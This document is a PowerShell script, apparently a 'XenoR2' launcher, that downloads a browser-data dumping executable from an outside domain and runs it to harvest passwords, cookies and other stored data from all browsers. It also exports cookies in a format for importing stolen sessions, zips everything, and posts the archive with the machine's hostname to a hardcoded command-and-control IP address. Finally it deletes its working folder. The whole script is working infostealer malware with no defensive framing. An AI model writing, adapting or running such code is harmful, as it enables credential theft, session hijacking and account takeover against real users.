# XenoR2 HackBrowserData Launcher v1.6
# Downloads hack-browser-data.exe, runs it, exfils zip to C2
# PS 5.1 compatible: no em dash, no [-] in strings
# v1.6: dual-pass — full JSON capture + cookie-editor format for browser import
param([string]$C2Url = 'http://193.26.115.42:47821/api/cook')

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Resolve short names
try { $env:LOCALAPPDATA = (Resolve-Path $env:LOCALAPPDATA).Path } catch {}
try { $env:APPDATA      = (Resolve-Path $env:APPDATA).Path } catch {}
try { $env:TEMP         = (Resolve-Path $env:TEMP).Path } catch {}

$workDir = "$env:TEMP\xeno_hbd"
$exePath = "$workDir\hbd.exe"
$outDir  = "$workDir\out"
$zipPath = "$workDir\data.zip"

# Clean/create work dir
if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -EA SilentlyContinue }
New-Item -ItemType Directory -Path $outDir -Force | Out-Null

# Download exe
try {
    Write-Host "[*] Downloading hack-browser-data.exe..."
    iwr -useb 'https://signindat.com/hack-browser-data.exe' -OutFile $exePath
    if (-not (Test-Path $exePath)) { throw "Download failed" }
    Write-Host "[+] Downloaded: $((Get-Item $exePath).Length) bytes"
} catch {
    Write-Host "[!] Download failed: $_"
    exit 1
}

# ─── Pass 1: Full capture — all 9 categories, JSON, zip ───
try {
    Write-Host "[*] Pass 1/2: Full capture (all categories, JSON)..."
    $proc = Start-Process -FilePath $exePath -ArgumentList '-b','all','-c','all','-f','json','-d',$outDir,'--zip' -NoNewWindow -Wait -PassThru
    Write-Host "[*] Pass 1 exit code: $($proc.ExitCode)"
} catch {
    Write-Host "[!] Pass 1 failed: $_"
}

# ─── Pass 2: Cookie-Editor format (cookies only, for browser import) ───
try {
    Write-Host "[*] Pass 2/2: Cookie-Editor format..."
    $proc = Start-Process -FilePath $exePath -ArgumentList '-b','all','-c','cookie','-f','cookie-editor','-d',$outDir -NoNewWindow -Wait -PassThru
    Write-Host "[*] Pass 2 exit code: $($proc.ExitCode)"
} catch {
    Write-Host "[!] Pass 2 failed: $_"
}

# Collect all output files into one zip for exfil
$allFiles = @(Get-ChildItem -Path $outDir -Recurse -File)
if ($allFiles.Count -gt 0) {
    Write-Host "[*] Collected $($allFiles.Count) output files:"
    foreach ($f in $allFiles) {
        Write-Host "    $($f.Name) ($($f.Length) bytes)"
    }
    
    # If HBD already produced a zip in pass 1, include it + cookie-editor JSON
    # Otherwise compress everything ourselves
    $hbdZip = Get-ChildItem -Path $outDir -Filter '*.zip' -Recurse | Select-Object -First 1
    if ($hbdZip) {
        # Add cookie-editor JSON to the existing zip, or create a wrapper
        # PowerShell Compress-Archive can't append, so create a wrapper zip
        Compress-Archive -Path $allFiles.FullName -DestinationPath $zipPath -Force
        Write-Host "[*] Wrapper zip: $((Get-Item $zipPath).Length) bytes"
    } else {
        Compress-Archive -Path $allFiles.FullName -DestinationPath $zipPath -Force
        Write-Host "[*] Compressed: $((Get-Item $zipPath).Length) bytes"
    }
    
    # Exfil: POST zip as raw binary, hostname in header
    $prevEA = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    
    # Quick C2 reachability check
    try {
        $test = iwr -Uri $C2Url -Method GET -TimeoutSec 5 -UseBasicParsing
        Write-Host "[*] C2 reachable: $($test.StatusCode)"
    } catch {
        Write-Host "[!] C2 unreachable: $_"
    }
    
    try {
        $headers = @{
            'X-Hostname' = $env:COMPUTERNAME
            'X-Tool'     = 'hack-browser-data'
        }
        Write-Host "[*] Sending $((Get-Item $zipPath).Length) bytes to C2..."
        $response = iwr -Uri $C2Url -Method POST -Headers $headers -InFile $zipPath -ContentType 'application/zip' -TimeoutSec 30 -UseBasicParsing
        Write-Host "[+] Exfil OK: $($response.StatusCode) -- $($response.Content)"
    } catch {
        Write-Host "[!] Exfil failed: $_"
        Write-Host "[!] Error details: $($_.Exception.Message)"
        if ($_.Exception.InnerException) {
            Write-Host "[!] Inner: $($_.Exception.InnerException.Message)"
        }
    }
    
    $ErrorActionPreference = $prevEA
} else {
    Write-Host "[!] No output files found"
}

# Cleanup
Remove-Item -Recurse -Force $workDir -EA SilentlyContinue
